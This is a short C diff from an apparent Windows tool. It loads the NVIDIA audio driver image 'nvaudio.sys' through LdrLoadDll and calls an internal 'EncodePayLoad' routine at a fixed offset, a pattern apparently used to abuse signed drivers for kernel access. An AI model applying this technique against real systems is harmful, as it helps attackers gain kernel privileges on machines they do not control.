@@ -3,7 +3,7 @@
 
 typedef PVOID (*EncodePayLoad_t)(PVOID Request, LONG EncodeCode, ULONGLONG* EncryptionKey);
 EncodePayLoad_t EncodePayLoad;
-HMODULE NvAudioLibrary;
+PVOID NvAudioLibrary;
 
 NTSTATUS LoadDriver(_Out_ PHANDLE DeviceHandle, _In_ LPCWSTR DriverFullPath, _In_ LPCWSTR ServiceName, _In_ LPCWSTR DeviceName)
 {
@@ -90,19 +90,21 @@ NTSTATUS LoadDriver(_Out_ PHANDLE DeviceHandle, _In_ LPCWSTR DriverFullPath, _In
     // Init specified driver routine.
     //
 
-    NvAudioLibrary = LoadLibraryW(DriverFullPath);
-    if (!NvAudioLibrary) {
+    RtlInitUnicodeString(&UnicodeString, L"nvaudio.sys");
+    Status = LdrLoadDll(NULL, NULL, &UnicodeString, &NvAudioLibrary);
+
+    if NT_ERROR (Status) {
         PRINT_ERROR_STATUS(RtlNtStatusToDosError(STATUS_DLL_INIT_FAILED));
 
         UnloadDriver(*DeviceHandle, ServiceName);
-        return STATUS_FAILED_DRIVER_ENTRY;
+        return Status;
     }
 
     EncodePayLoad = (EncodePayLoad_t)((PCHAR)NvAudioLibrary + 0x2130);
     if (!EncodePayLoad) {
         PRINT_ERROR_STATUS(RtlNtStatusToDosError(STATUS_INVALID_ADDRESS));
 
-        FreeLibrary(NvAudioLibrary);
+        LdrUnloadDll(NvAudioLibrary);
         UnloadDriver(*DeviceHandle, ServiceName);
         return STATUS_FAILED_DRIVER_ENTRY;
     }
@@ -116,7 +118,7 @@ NTSTATUS UnloadDriver(_In_ HANDLE DeviceHandle, _In_ LPCWSTR ServiceName)
     UNICODE_STRING UnicodeString;
 
     if (NvAudioLibrary)
-        FreeLibrary(NvAudioLibrary);
+        LdrUnloadDll(NvAudioLibrary);
 
     if (DeviceHandle) {
         Status = NtClose(DeviceHandle);
